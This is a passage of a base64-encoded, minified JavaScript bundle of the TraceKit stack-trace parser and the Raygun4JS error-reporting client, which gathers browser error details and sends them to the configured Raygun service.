Ape3ZhciBfPWFbcF07Xy5zcmMmJm8ucHVzaChfLnNyYyl9aWYoaT1oLmV4ZWModSkpe3ZhciBtPWlbMV0/IlxccysiK2lbMV06IiIseT1pWzJdLnNwbGl0KCIsIikuam9pbigiXFxzKixcXHMqIik7bj1jKGlbM10pLnJlcGxhY2UoLzskLywiOz8iKSxyPW5ldyBSZWdFeHAoImZ1bmN0aW9uIittKyJcXHMqXFwoXFxzKiIreSsiXFxzKlxcKVxccyp7XFxzKiIrbisiXFxzKn0iKX1lbHNlIHI9bmV3IFJlZ0V4cChjKHUpLnJlcGxhY2UoL1xzKy9nLCJcXHMrIikpO2lmKHM9ZChyLG8pKXJldHVybiBzO2lmKGk9Zi5leGVjKHUpKXt2YXIgZz1pWzFdO2lmKG49bChpWzJdKSxyPW5ldyBSZWdFeHAoIm9uIitnKyI9W1xcJ1wiXVxccyoiK24rIlxccypbXFwnXCJdIiwiaSIpLHM9ZChyLG9bMF0pKXJldHVybiBzO2lmKHI9bmV3IFJlZ0V4cChuKSxzPWQocixvKSlyZXR1cm4gc31yZXR1cm4gbnVsbH1mdW5jdGlvbiBwKGUpe2lmKCFlLnN0YWNrKXJldHVybiBudWxsO2Zvcih2YXIgdCxuLHI9L15ccyphdCAoLio/KSA/XCg/KCg/OmZpbGV8aHR0cHxodHRwc3xjaHJvbWUtZXh0ZW5zaW9uKTouKj8pOihcZCspKD86OihcZCspKT9cKT9ccyokL2ksaT0vXlxzKiguKj8pKD86XCgoLio/KVwpKT9APygoPzpmaWxlfGh0dHB8aHR0cHN8Y2hyb21lKTouKj8pOihcZCspKD86OihcZCspKT9ccyokL2kscz0vXlxzKmF0ICg/OigoPzpcW29iamVjdCBvYmplY3RcXSk/LispICk/XCg/KCg/Om1zLWFwcHh8aHR0cHxodHRwcyk6Lio/KTooXGQrKSg/OjooXGQrKSk/XCk/XHMqJC9pLGM9ZS5zdGFjay5zcGxpdCgiXG4iKSxsPVtdLGQ9L14oLiopIGlzIHVuZGVmaW5lZCQvLmV4ZWMoZS5tZXNzYWdlKSxmPTAscD1jLmxlbmd0aDtwPmY7KytmKXtpZih0PWkuZXhlYyhjW2ZdKSluPXt1cmw6dFszXSxmdW5jOnRbMV18fGEsYXJnczp0WzJdP3RbMl0uc3BsaXQoIiwiKToiIixsaW5lOit0WzRdLGNvbHVtbjp0WzVdPyt0WzVdOm51bGx9O2Vsc2UgaWYodD1yLmV4ZWMoY1tmXSkpbj17dXJsOnRbMl0sZnVuYzp0WzFdfHxhLGxpbmU6K3RbM10sY29sdW1uOnRbNF0/K3RbNF06bnVsbH07ZWxzZXtpZighKHQ9cy5leGVjKGNbZl0pKSljb250aW51ZTtuPXt1cmw6dFsyXSxmdW5jOnRbMV18fGEsbGluZTordFszXSxjb2x1bW46dFs0XT8rdFs0XTpudWxsfX0hbi5mdW5jJiZuLmxpbmUmJihuLmZ1bmM9byhuLnVybCxuLmxpbmUpKSxuLmxpbmUmJihuLmNvbnRleHQ9dShuLnVybCxuLmxpbmUpKSxsLnB1c2gobil9cmV0dXJuIGxbMF0mJmxbMF0ubGluZSYmIWxbMF0uY29sdW1uJiZkP2xbMF0uY29sdW1uPWgoZFsxXSxsWzBdLnVybCxsWzBdLmxpbmUpOmxbMF0uY29sdW1ufHwidW5kZWZpbmVkIj09dHlwZW9mIGUuY29sdW1uTnVtYmVyfHwobFswXS5jb2x1bW49ZS5jb2x1bW5OdW1iZXIrMSksbC5sZW5ndGg/e21vZGU6InN0YWNrIixuYW1lOmUubmFtZSxtZXNzYWdlOmUubWVzc2FnZSx1cmw6ZG9jdW1lbnQubG9jYXRpb24uaHJlZixzdGFjazpsLHVzZXJhZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50fTpudWxsfWZ1bmN0aW9uIF8oZSl7Zm9yKHZhciB0LG49ZS5zdGFja3RyYWNlLHI9LyBsaW5lIChcZCspLCBjb2x1bW4gKFxkKykgaW4gKD86PGFub255bW91cyBmdW5jdGlvbjogKFtePl0rKT58KFteXCldKykpXCgoLiopXCkgaW4gKC4qKTpccyokL2ksaT1udWxsIT09bj9uLnNwbGl0KCJcbiIpOm4scz1bXSxhPTAsYz1pLmxlbmd0aDtjPmE7YSs9MilpZih0PXIuZXhlYyhpW2FdKSl7dmFyIGw9e2xpbmU6K3RbMV0sY29sdW1uOit0WzJdLGZ1bmM6dFszXXx8dFs0XSxhcmdzOnRbNV0/dFs1XS5zcGxpdCgiLCIpOltdLHVybDp0WzZdfTtpZighbC5mdW5jJiZsLmxpbmUmJihsLmZ1bmM9byhsLnVybCxsLmxpbmUpKSxsLmxpbmUpdHJ5e2wuY29udGV4dD11KGwudXJsLGwubGluZSl9Y2F0Y2goZCl7fWwuY29udGV4dHx8KGwuY29udGV4dD1baVthKzFdXSkscy5wdXNoKGwpfXJldHVybiBzLmxlbmd0aD97bW9kZToic3RhY2t0cmFjZSIsbmFtZTplLm5hbWUsbWVzc2FnZTplLm1lc3NhZ2UsdXJsOmRvY3VtZW50LmxvY2F0aW9uLmhyZWYsc3RhY2s6cyx1c2VyYWdlbnQ6bmF2aWdhdG9yLnVzZXJBZ2VudH06bnVsbH1mdW5jdGlvbiBtKHQpe3ZhciByPXQubWVzc2FnZS5zcGxpdCgiXG4iKTtpZihyLmxlbmd0aDw0KXJldHVybiBudWxsO3ZhciBpLGEsYyxoLGY9L15ccypMaW5lIChcZCspIG9mIGxpbmtlZCBzY3JpcHQgKCg/OmZpbGV8aHR0cHxodHRwcylcUyspKD86OiBpbiBmdW5jdGlvbiAoXFMrKSk/XHMqJC9pLHA9L15ccypMaW5lIChcZCspIG9mIGlubGluZSMoXGQrKSBzY3JpcHQgaW4gKCg/OmZpbGV8aHR0cHxodHRwcylcUyspKD86OiBpbiBmdW5jdGlvbiAoXFMrKSk/XHMqJC9pLF89L15ccypMaW5lIChcZCspIG9mIGZ1bmN0aW9uIHNjcmlwdFxzKiQvaSxtPVtdLHk9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpLGc9W107Zm9yKGEgaW4geSluKHksYSkmJiF5W2FdLnNyYyYmZy5wdXNoKHlbYV0pO2ZvcihhPTIsYz1yLmxlbmd0aDtjPmE7YSs9Mil7dmFyIHY9bnVsbDtpZihpPWYuZXhlYyhyW2FdKSl2PXt1cmw6aVsyXSxmdW5jOmlbM10sbGluZToraVsxXX07ZWxzZSBpZihpPXAuZXhlYyhyW2FdKSl7dj17dXJsOmlbM10sZnVuYzppWzRdfTt2YXIgYj0raVsxXSxNPWdbaVsyXS0xXTtpZihNJiYoaD1zKHYudXJsKSkpe2g9aC5qb2luKCJcbiIpO3ZhciBMPWguaW5kZXhPZihNLmlubmVyVGV4dCk7TD49MCYmKHYubGluZT1iK2guc3Vic3RyaW5nKDAsTCkuc3BsaXQoIlxuIikubGVuZ3RoKX19ZWxzZSBpZihpPV8uZXhlYyhyW2FdKSl7dmFyIGs9ZS5sb2NhdGlvbi5ocmVmLnJlcGxhY2UoLyMuKiQvLCIiKSx3PWlbMV0sVD1uZXcgUmVnRXhwKGwoclthKzFdKSk7aD1kKFQsW2tdKSx2PXt1cmw6ayxsaW5lOmg/aC5saW5lOncsZnVuYzoiIn19aWYodil7di5mdW5jfHwodi5mdW5jPW8odi51cmwsdi5saW5lKSk7dmFyIFk9dSh2LnVybCx2LmxpbmUpLEQ9WT9ZW01hdGguZmxvb3IoWS5sZW5ndGgvMildOm51bGw7WSYmRC5yZXBsYWNlKC9eXHMqLywiIik9PT1yW2ErMV0ucmVwbGFjZSgvXlxzKi8sIiIpP3YuY29udGV4dD1ZOnYuY29udGV4dD1bclthKzFdXSxtLnB1c2godil9fXJldHVybiBtLmxlbmd0aD97bW9kZToibXVsdGlsaW5lIixuYW1lOnQubmFtZSxtZXNzYWdlOnJbMF0sdXJsOmRvY3VtZW50LmxvY2F0aW9uLmhyZWYsc3RhY2s6bSx1c2VyYWdlbnQ6bmF2aWdhdG9yLnVzZXJBZ2VudH06bnVsbH1mdW5jdGlvbiB5KGUsdCxuLHIpe3ZhciBpPXt1cmw6dCxsaW5lOm59O2lmKGkudXJsJiZpLmxpbmUpe2UuaW5jb21wbGV0ZT0hMSxpLmZ1bmN8fChpLmZ1bmM9byhpLnVybCxpLmxpbmUpKSxpLmNvbnRleHR8fChpLmNvbnRleHQ9dShpLnVybCxpLmxpbmUpKTt2YXIgcz0vICcoW14nXSspJyAvLmV4ZWMocik7aWYocyYmKGkuY29sdW1uPWgoc1sxXSxpLnVybCxpLmxpbmUpKSxlLnN0YWNrLmxlbmd0aD4wJiZlLnN0YWNrWzBdLnVybD09PWkudXJsKXtpZihlLnN0YWNrWzBdLmxpbmU9PT1pLmxpbmUpcmV0dXJuITE7aWYoIWUuc3RhY2tbMF0ubGluZSYmZS5zdGFja1swXS5mdW5jPT09aS5mdW5jKXJldHVybiBlLnN0YWNrWzBdLmxpbmU9aS5saW5lLGUuc3RhY2tbMF0uY29udGV4dD1pLmNvbnRleHQsITF9cmV0dXJuIGUuc3RhY2sudW5zaGlmdChpKSxlLnBhcnRpYWw9ITAsITB9cmV0dXJuIGUuaW5jb21wbGV0ZT0hMCwhMX1mdW5jdGlvbiBnKGUsdCl7Zm9yKHZhciBuLHIscyx1PS9mdW5jdGlvblxzKyhbXyRhLXpBLVpceEEwLVx1RkZGRl1bXyRhLXpBLVowLTlceEEwLVx1RkZGRl0qKT9ccypcKC9pLGM9W10sbD17fSxkPSExLHA9Zy5jYWxsZXI7cCYmIWQ7cD1wLmNhbGxlcilpZihwIT09diYmcCE9PWkucmVwb3J0KXtpZihyPXt1cmw6bnVsbCxmdW5jOmEsbGluZTpudWxsLGNvbHVtbjpudWxsfSxwLm5hbWU/ci5mdW5jPXAubmFtZToobj11LmV4ZWMocC50b1N0cmluZygpKSkmJihyLmZ1bmM9blsxXSksInVuZGVmaW5lZCI9PXR5cGVvZiByLmZ1bmMpdHJ5e3IuZnVuYz1uLmlucHV0LnN1YnN0cmluZygwLG4uaW5wdXQuaW5kZXhPZigieyIpKX1jYXRjaChfKXt9aWYocz1mKHApKXtyLnVybD1zLnVybCxyLmxpbmU9cy5saW5lLHIuZnVuYz09PWEmJihyLmZ1bmM9byhyLnVybCxyLmxpbmUpKTt2YXIgbT0vICcoW14nXSspJyAvLmV4ZWMoZS5tZXNzYWdlfHxlLmRlc2NyaXB0aW9uKTttJiYoci5jb2x1bW49aChtWzFdLHMudXJsLHMubGluZSkpfWxbIiIrcF0/ZD0hMDpsWyIiK3BdPSEwLGMucHVzaChyKX10JiZjLnNwbGljZSgwLHQpO3ZhciBiPXttb2RlOiJjYWxsZXJzIixuYW1lOmUubmFtZSxtZXNzYWdlOmUubWVzc2FnZSx1cmw6ZG9jdW1lbnQubG9jYXRpb24uaHJlZixzdGFjazpjLHVzZXJhZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50fTtyZXR1cm4geShiLGUuc291cmNlVVJMfHxlLmZpbGVOYW1lLGUubGluZXx8ZS5saW5lTnVtYmVyLGUubWVzc2FnZXx8ZS5kZXNjcmlwdGlvbiksYn1mdW5jdGlvbiB2KGUsdCl7dmFyIG49bnVsbDt0PW51bGw9PXQ/MDordDt0cnl7aWYobj1fKGUpKXJldHVybiBufWNhdGNoKHIpe2lmKE0pdGhyb3cgcn10cnl7aWYobj1wKGUpKXJldHVybiBufWNhdGNoKHIpe2lmKE0pdGhyb3cgcn10cnl7aWYobj1tKGUpKXJldHVybiBufWNhdGNoKHIpe2lmKE0pdGhyb3cgcn10cnl7aWYobj1nKGUsdCsxKSlyZXR1cm4gbn1jYXRjaChyKXtpZihNKXRocm93IHJ9cmV0dXJue21vZGU6ImZhaWxlZCJ9fWZ1bmN0aW9uIGIoZSl7ZT0obnVsbD09ZT8wOitlKSsxO3RyeXt0aHJvdyBuZXcgRXJyb3J9Y2F0Y2godCl7cmV0dXJuIHYodCxlKzEpfX12YXIgTT0hMSxMPXt9O3JldHVybiB2LmF1Z21lbnRTdGFja1RyYWNlV2l0aEluaXRpYWxFbGVtZW50PXksdi5ndWVzc0Z1bmN0aW9uTmFtZT1vLHYuZ2F0aGVyQ29udGV4dD11LHYub2ZDYWxsZXI9Yix2fSgpLGkuZXh0ZW5kVG9Bc3luY2hyb25vdXNDYWxsYmFja3M9ZnVuY3Rpb24oKXt2YXIgdD1mdW5jdGlvbih0KXt2YXIgbj1lW3RdO2VbdF09ZnVuY3Rpb24oKXt2YXIgZT1vLmNhbGwoYXJndW1lbnRzKSx0PWVbMF07cmV0dXJuImZ1bmN0aW9uIj09dHlwZW9mIHQmJihlWzBdPWkud3JhcCh0KSksbi5hcHBseT9uLmFwcGx5KHRoaXMsZSk6bihlWzBdLGVbMV0pfX07dCgic2V0VGltZW91dCIpLHQoInNldEludGVydmFsIil9LGkucmVtb3RlRmV0Y2hpbmd8fChpLnJlbW90ZUZldGNoaW5nPSEwKSxpLmNvbGxlY3RXaW5kb3dFcnJvcnN8fChpLmNvbGxlY3RXaW5kb3dFcnJvcnM9ITApLCghaS5saW5lc09mQ29udGV4dHx8aS5saW5lc09mQ29udGV4dDwxKSYmKGkubGluZXNPZkNvbnRleHQ9MTEpLGUuVHJhY2VLaXQ9aX0od2luZG93KSxmdW5jdGlvbihlLHQpeyJ1c2Ugc3RyaWN0IjtpZihlKXt2YXIgbj1lLmV2ZW50LmFkZDtlLmV2ZW50LmFkZD1mdW5jdGlvbihyLGkscyxvLGEpeyJmdW5jdGlvbiIhPXR5cGVvZiBzJiYiZnVuY3Rpb24iIT10eXBlb2Ygcy5oYW5kbGVyJiZuLmNhbGwodGhpcyxyLGkscyxvLGEpO3ZhciB1O3JldHVybiBzLmhhbmRsZXI/KHU9cy5oYW5kbGVyLHMuaGFuZGxlcj10LndyYXAocy5oYW5kbGVyKSk6KHU9cyxzPXQud3JhcChzKSksdS5ndWlkP3MuZ3VpZD11Lmd1aWQ6cy5ndWlkPXUuZ3VpZD1lLmd1aWQrKyxuLmNhbGwodGhpcyxyLGkscyxvLGEpfTt2YXIgcj1lLmZuLnJlYWR5O2UuZm4ucmVhZHk9ZnVuY3Rpb24oZSl7cmV0dXJuIHIuY2FsbCh0aGlzLHQud3JhcChlKSl9O3ZhciBpPWUuYWpheDtlLmFqYXg9ZnVuY3Rpb24obixyKXsib2JqZWN0Ij09dHlwZW9mIG4mJihyPW4sbj12b2lkIDApLHI9cnx8e307Zm9yKHZhciBzLG89WyJjb21wbGV0ZSIsImVycm9yIiwic3VjY2VzcyJdO3M9by5wb3AoKTspZS5pc0Z1bmN0aW9uKHJbc10pJiYocltzXT10LndyYXAocltzXSkpO3RyeXtyZXR1cm4gbj9pLmNhbGwodGhpcyxuLHIpOmkuY2FsbCh0aGlzLHIpfWNhdGNoKGEpe3Rocm93IHQucmVwb3J0KGEpLGF9fX19KHdpbmRvdy5qUXVlcnksd2luZG93LlRyYWNlS2l0KTt2YXIgbj1mdW5jdGlvbihlLHQsbil7ZnVuY3Rpb24gcihlKXt2YXIgdD1lLG49ZS5zcGxpdCgiLy8iKVsxXTtpZihuKXt2YXIgcj1uLmluZGV4T2YoIj8iKSxpPW4udG9TdHJpbmcoKS5zdWJzdHJpbmcoMCxyKSxzPWkuc3BsaXQoIi8iKS5zbGljZSgwLDQpLmpvaW4oIi8iKSxvPWkuc3Vic3RyaW5nKDAsNDgpO3Q9cy5sZW5ndGg8by5sZW5ndGg/czpvLHQhPT1pJiYodCs9Ii4uIil9cmV0dXJuIHR9ZnVuY3Rpb24gaShlLHQsaSxzKXt2YXIgbz0iQUpBWCBFcnJvcjogIisodC5zdGF0dXNUZXh0fHwidW5rbm93biIpKyIgIisoaS50eXBlfHwidW5rbm93biIpKyIgIisocihpLnVybCl8fCJ1bmtub3duIik7UCYmIXQuZ2V0QWxsUmVzcG9uc2VIZWFkZXJzKCl8fEouc2VuZChzfHxlLnR5cGUse3N0YXR1czp0LnN0YXR1cyxzdGF0dXNUZXh0OnQuc3RhdHVzVGV4dCx0eXBlOmkudHlwZSx1cmw6aS51cmwsYWpheEVycm9yTWVzc2FnZTpvLGNvbnRlbnRUeXBlOmkuY29udGVudFR5cGUscmVxdWVzdERhdGE6aS5kYXRhJiZpLmRhdGEuc2xpY2U/aS5kYXRhLnNsaWNlKDAsMTAyNDApOm4scmVzcG9uc2VEYXRhOnQucmVzcG9uc2VUZXh0JiZ0LnJlc3BvbnNlVGV4dC5zbGljZT90LnJlc3BvbnNlVGV4dC5zbGljZSgwLDEwMjQwKTpuLGFjdGl2ZVRhcmdldDplLnRhcmdldCYmZS50YXJnZXQuYWN0aXZlRWxlbWVudCYmZS50YXJnZXQuYWN0aXZlRWxlbWVudC5vdXRlckhUTUwmJmUudGFyZ2V0LmFjdGl2ZUVsZW1lbnQub3V0ZXJIVE1MLnNsaWNlP2UudGFyZ2V0LmFjdGl2ZUVsZW1lbnQub3V0ZXJIVE1MLnNsaWNlKDAsMTAyNDApOm59KX1mdW5jdGlvbiBzKCl7cmV0dXJuIEwmJiIiIT09TD8hMDooJC5sb2coIlJheWd1biBBUEkga2V5IGhhcyBub3QgYmVlbiBjb25maWd1cmVkLCBtYWtlIHN1cmUgeW91IGNhbGwgUmF5Z3VuLmluaXQoeW91ckFwaUtleSkiKSwhMSl9ZnVuY3Rpb24gbyhlLHQpe3ZhciBuLHI9e307Zm9yKG4gaW4gZSlyW25dPWVbbl07Zm9yKG4gaW4gdClyW25dPXRbbl07cmV0dXJuIHJ9ZnVuY3Rpb24gYShlLHQpe3JldHVybiBudWxsIT10P2UuY29uY2F0KHQpOmV9ZnVuY3Rpb24gdShlLHQpe2Zvcih2YXIgbj0wO248ZS5sZW5ndGg7bisrKXQuY2FsbChudWxsLG4sZVtuXSl9ZnVuY3Rpb24gYyhlKXtmb3IodmFyIHQgaW4gZSlpZihlLmhhc093blByb3BlcnR5KHQpKXJldHVybiExO3JldHVybiEwfWZ1bmN0aW9uIGwoKXtyZXR1cm4gTWF0aC5mbG9vcig5MDA3MTk5MjU0NzQwOTkyKk1hdGgucmFuZG9tKCkpfWZ1bmN0aW9uIGQoKXt2YXIgdD1kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQsbj1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiYm9keSIpWzBdLHI9ZS5pbm5lcldpZHRofHx0LmNsaWVudFdpZHRofHxuLmNsaWVudFdpZHRoLGk9ZS5pbm5lckhlaWdodHx8dC5jbGllbnRIZWlnaHR8fG4uY2xpZW50SGVpZ2h0O3JldHVybnt3aWR0aDpyLGhlaWdodDppfX1mdW5jdGlvbiBoKGUpe3ZhciB0PShuZXcgRGF0ZSkudG9KU09OKCk7dHJ5e3ZhciBuPSJyYXlndW5qcz0iK3QrIj0iK2woKTsidW5kZWZpbmVkIj09dHlwZW9mIGxvY2FsU3RvcmFnZVtuXSYmKGxvY2FsU3RvcmFnZVtuXT1lKX1jYXRjaChyKXskLmxvZygiUmF5Z3VuNEpTOiBMb2NhbFN0b3JhZ2UgZnVsbCwgY2Fubm90IHNhdmUgZXhjZXB0aW9uIil9fWZ1bmN0aW9uIGYoKXt0cnl7cmV0dXJuImxvY2FsU3RvcmFnZSJpbiBlJiZudWxsIT09ZS5sb2NhbFN0b3JhZ2V9Y2F0Y2godCl7cmV0dXJuITF9fWZ1bmN0aW9uIHAoKXtpZihmKCkmJmxvY2FsU3RvcmFnZSYmbG9jYWxTdG9yYWdlLmxlbmd0aD4wKWZvcih2YXIgZSBpbiBsb2NhbFN0b3JhZ2UpaWYoInJheWd1bmpzPSI9PT1lLnN1YnN0cmluZygwLDkpKXt0cnl7dihKU09OLnBhcnNlKGxvY2FsU3RvcmFnZVtlXSkpfWNhdGNoKHQpeyQubG9nKCJSYXlndW40SlM6IEludmFsaWQgSlNPTiBvYmplY3QgaW4gTG9jYWxTdG9yYWdlIil9dHJ5e2xvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKGUpfWNhdGNoKHQpeyQubG9nKCJSYXlndW40SlM6IFVuYWJsZSB0byByZW1vdmUgZXJyb3IiKX19fWZ1bmN0aW9uIF8oKXtpZighayYmIUEpe3ZhciBlLHQ9InJheWd1bjRqcy11c2VyaWQiLG49JC5yZWFkQ29va2llKHQpO24/ZT1uOihlPSQuZ2V0VXVpZCgpLCQuY3JlYXRlQ29va2llKHQsZSw3NDQpKSxKLnNldFVzZXIoZSwhMCxudWxsLG51bGwsbnVsbCxlKX19ZnVuY3Rpb24gbShlLHQpe2lmKFQpZm9yKHZhciBuPTA7bjxULmxlbmd0aDtuKyspaWYoIm9iamVjdCI9PXR5cGVvZiBUW25dJiYiZnVuY3Rpb24iPT10eXBlb2YgVFtuXS5leGVjKXtpZihudWxsIT09VFtuXS5leGVjKGUpKXJldHVybiJbcmVtb3ZlZCBieSBmaWx0ZXJdIn1lbHNlIGlmKFRbbl09PT1lKXJldHVybiJbcmVtb3ZlZCBieSBmaWx0ZXJdIjtyZXR1cm4gdH1mdW5jdGlvbiB5KGUsdCl7aWYobnVsbD09ZSlyZXR1cm4gZTtpZigiW29iamVjdCBPYmplY3RdIiE9PU9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcuY2FsbChlKSlyZXR1cm4gZTtmb3IodmFyIG4gaW4gZSl7dmFyIHI9ZVtuXTtudWxsIT1yJiYoIltvYmplY3QgT2JqZWN0XSI9PT1PYmplY3QucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwocik/IkRldGFpbHMiPT09dCYmIkNsaWVudCI9PT1ufHwoZVtuXT15KG0obixyKSxuKSk6InVuZGVmaW5lZCI9PXR5cGVvZiB0JiYiT2NjdXJyZWRPbiI9PT1ufHwoZVtuXT1tKG4scikpKX1yZXR1cm4gZX1mdW5jdGlvbiBnKHQscil7dmFyIGk9W10scz17fTtpZihDKXtpZighdC5zdGFja3x8IXQuc3RhY2subGVuZ3RoKXJldHVybiB2b2lkICQubG9nKCJSYXlndW40SlM6IENhbmNlbGxpbmcgc2VuZCBkdWUgdG8gbnVsbCBzdGFja3RyYWNlIik7dmFyIG89JC5wYXJzZVVybCgiZG9tYWluIiksYT0iU2NyaXB0IGVycm9yIixsPXQubWVzc2FnZXx8ci5zdGF0dXN8fGE7aWYobC5zdWJzdHJpbmcoMCxhLmxlbmd0aCk9PT1hJiZudWxsIT09dC5zdGFja1swXS51cmwmJi0xPT09dC5zdGFja1swXS51cmwuaW5kZXhPZihvKSYmKDA9PT10LnN0YWNrWzBdLmxpbmV8fCI/Ij09PXQuc3RhY2tbMF0uZnVuYykpcmV0dXJuIHZvaWQgJC5sb2coIlJheWd1bjRKUzogY2FuY2VsbGluZyBzZW5kIGR1ZSB0byB0aGlyZC1wYXJ0eSBzY3JpcHQgZXJyb3Igd2l0aCBubyBzdGFja3RyYWNlIGFuZCBtZXNzYWdlIik7aWYobnVsbCE9PXQuc3RhY2tbMF0udXJsJiYtMT09PXQuc3RhY2tbMF0udXJsLmluZGV4T2Yobykpe3ZhciBoPSExO2Zvcih2YXIgZiBpbiBJKXQuc3RhY2tbMF0udXJsLmluZGV4T2YoSVtmXSk+LTEmJihoPSEwKTtpZighaClyZXR1cm4gdm9pZCAkLmxvZygiUmF5Z3VuNEpTOiBjYW5jZWxsaW5nIHNlbmQgZHVlIHRvIGVycm9yIG9uIG5vbi1vcmlnaW4sIG5vbi13aGl0ZWxpc3RlZCBkb21haW4iKX19aWYoVSBpbnN0YW5jZW9mIEFycmF5KWZvcih2YXIgcCBpbiBVKWlmKFUuaGFzT3duUHJvcGVydHkocCkmJmUubG9jYXRpb24uaG9zdG5hbWUmJmUubG9jYXRpb24uaG9zdG5hbWUubWF0Y2goVVtwXSkpcmV0dXJuIHZvaWQgJC5sb2coIlJheWd1bjRKUzogY2FuY2VsbGluZyBzZW5kIGFzIGVycm9yIG9yaWdpbmF0ZXMgZnJvbSBhbiBleGNsdWRlZCBob3N0bmFtZSIpO2lmKHogaW5zdGFuY2VvZiBBcnJheSlmb3IodmFyIGcgaW4geilpZih6Lmhhc093blByb3BlcnR5KGcpJiZuYXZpZ2F0b3IudXNlckFnZW50Lm1hdGNoKHpbZ10pKXJldHVybiB2b2lkICQubG9nKCJSYXlndW40SlM6IGNhbmNlbGxpbmcgc2VuZCBhcyBlcnJvciBvcmlnaW5hdGVzIGZyb20gYW4gZXhjbHVkZWQgdXNlciBhZ2VudCIpO3Quc3RhY2smJnQuc3RhY2subGVuZ3RoJiZ1KHQuc3RhY2ssZnVuY3Rpb24oZSx0KXtpLnB1c2goe0xpbmVOdW1iZXI6dC5saW5lLENvbHVtbk51bWJlcjp0LmNvbHVtbixDbGFzc05hbWU6ImxpbmUgIit0LmxpbmUrIiwgY29sdW1uICIrdC5jb2x1bW4sRmlsZU5hbWU6dC51cmwsTWV0aG9kTmFtZTp0LmZ1bmN8fCJbYW5vbnltb3VzXSJ9KX0pO3ZhciBiPSQucGFyc2VVcmwoIj8iKTtiLmxlbmd0aD4wJiZ1KGIuc3BsaXQoIiYiKSxmdW5jdGlvbihlLHQpe3ZhciBuPXQuc3BsaXQoIj0iKTtpZihuJiYyPT09bi5sZW5ndGgpe3ZhciByPWRlY29kZVVSSUNvbXBvbmVudChuWzBdKSxpPW0ocixuWzFdKTtzW3JdPWl9fSkscj09PW4mJihyPXt9KSxjKHIuY3VzdG9tRGF0YSkmJigiZnVuY3Rpb24iPT10eXBlb2YgUj9yLmN1c3RvbURhdGE9UigpOnIuY3VzdG9tRGF0YT1SKSxjKHIudGFncykmJigiZnVuY3Rpb24iPT10eXBlb2YgTj9yLnRhZ3M9TigpOnIudGFncz1OKTt2YXIgTSxMPWUuc2NyZWVufHx7d2lkdGg6ZCgpLndpZHRoLGhlaWdodDpkKCkuaGVpZ2h0LGNvbG9yRGVwdGg6OH0sVD1yLmN1c3RvbURhdGEmJnIuY3VzdG9tRGF0YS5hamF4RXJyb3JNZXNzYWdlO009ImN1c3RvbURhdGEiPT09cT95KHIuY3VzdG9tRGF0YSwiVXNlckN1c3RvbURhdGEiKTpyLmN1c3RvbURhdGE7dHJ5e0pTT04uc3RyaW5naWZ5KE0pfWNhdGNoKEQpe3ZhciBsPSJDYW5ub3QgYWRkIGN1c3RvbSBkYXRhOyBtYXkgY29udGFpbiBjaXJjdWxhciByZWZlcmVuY2UiO009e2Vycm9yOmx9LCQubG9nKCJSYXlndW40SlM6ICIrbCl9dmFyIFM9VHx8dC5tZXNzYWdlfHxyLnN0YXR1c3x8IlNjcmlwdCBlcnJvciI7Uz1TLnN1YnN0cmluZygwLDUxMik7dmFyIHg9e09jY3VycmVkT246bmV3IERhdGUsRGV0YWlsczp7RXJyb3I6e0NsYXNzTmFtZTp0Lm5hbWUsTWVzc2FnZTpTLFN0YWNrVHJhY2U6aX0sRW52aXJvbm1lbnQ6e1V0Y09mZnNldDoobmV3IERhdGUpLmdldFRpbWV6b25lT2Zmc2V0KCkvLTYwLCJVc2VyLUxhbmd1YWdlIjpuYXZpZ2F0b3IudXNlckxhbmd1YWdlLCJEb2N1bWVudC1Nb2RlIjpkb2N1bWVudC5kb2N1bWVudE1vZGUsIkJyb3dzZXItV2lkdGgiOmQoKS53aWR0aCwiQnJvd3Nlci1IZWlnaHQiOmQoKS5oZWlnaHQsIlNjcmVlbi1XaWR0aCI6TC53aWR0aCwiU2NyZWVuLUhlaWdodCI6TC5oZWlnaHQsIkNvbG9yLURlcHRoIjpMLmNvbG9yRGVwdGgsQnJvd3NlcjpuYXZpZ2F0b3IuYXBwQ29kZU5hbWUsIkJyb3dzZXItTmFtZSI6bmF2aWdhdG9yLmFwcE5hbWUsIkJyb3dzZXItVmVyc2lvbiI6bmF2aWdhdG9yLmFwcFZlcnNpb24sUGxhdGZvcm06bmF2aWdhdG9yLnBsYXRmb3JtfSxDbGllbnQ6e05hbWU6InJheWd1bi1qcyIsVmVyc2lvbjoiMS4xOC42In0sVXNlckN1c3RvbURhdGE6TSxUYWdzOnIudGFncyxSZXF1ZXN0OntVcmw6W2xvY2F0aW9uLnByb3RvY29sLCIvLyIsbG9jYXRpb24uaG9zdCxsb2NhdGlvbi5wYXRobmFtZSxsb2NhdGlvbi5oYXNoXS5qb2luKCIiKSxRdWVyeVN0cmluZzpzLEhlYWRlcnM6eyJVc2VyLUFnZW50IjpuYXZpZ2F0b3IudXNlckFnZW50LFJlZmVyZXI6ZG9jdW1lbnQucmVmZXJyZXIsSG9zdDpkb2N1bWVudC5kb21haW59fSxWZXJzaW9uOnd8fCJOb3Qgc3VwcGxpZWQifX07aWYoXygpLHguRGV0YWlscy5Vc2VyPWssImFsbCI9PT1xJiYoeD15KHgpKSwiZnVuY3Rpb24iPT10eXBlb2YgWSl7dmFyIGo9WSh4KTtqJiZ2KGopfWVsc2Ugdih4KX1mdW5jdGlvbiB2KGUpe2lmKHMoKSl7JC5sb2coIlNlbmRpbmcgZXhjZXB0aW9uIGRhdGEgdG8gUmF5Z3VuOiIsZSk7dmFyIHQ9VysiL2VudHJpZXM/YXBpa2V5PSIrZW5jb2RlVVJJQ29tcG9uZW50KEwpO00odCxKU09OLnN0cmluZ2lmeShlKSl9fWZ1bmN0aW9uIGIodCxuKXt2YXIgcjtyZXR1cm4gcj1uZXcgZS5YTUxIdHRwUmVxdWVzdCwid2l0aENyZWRlbnRpYWxzImluIHI/ci5vcGVuKHQsbiwhMCk6ZS5YRG9tYWluUmVxdWVzdCYmKEgmJihuPW4uc2xpY2UoNikpLHI9bmV3IGUuWERvbWFpblJlcXVlc3Qsci5vcGVuKHQsbikpLHIudGltZW91dD0xZTQscn1mdW5jdGlvbiBNKHQsbil7dmFyIHI9YigiUE9TVCIsdCxuKTtyZXR1cm4id2l0aENyZWRlbnRpYWxzIml